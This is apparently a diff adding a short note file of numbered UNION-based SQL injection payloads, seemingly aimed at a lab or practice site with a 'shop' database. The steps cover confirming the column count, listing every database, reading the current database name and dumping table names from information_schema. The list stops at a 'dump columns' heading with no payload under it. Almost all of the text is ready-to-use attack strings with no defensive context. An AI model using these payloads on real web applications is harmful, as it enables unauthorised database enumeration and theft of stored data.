@@ -1,0 +1,13 @@
+1.check on union select
+test' UNION SELECT 1,2,3,4;-- -
+
+2.list all databases
+test' UNION SELECT 1,GROUP_CONCAT(0x7c,schema_name,0x7c),3,4 FROM information_schema.schemata;-- - 
+
+3.current database
+test' UNION SELECT 1,database(),3,4;-- -
+
+4.dump tables
+test' UNION SELECT 1,GROUP_CONCAT(0x7c,table_name,0x7c),3,4 FROM information_schema.tables  WHERE table_schema='shop';-- -
+
+5.dump columns
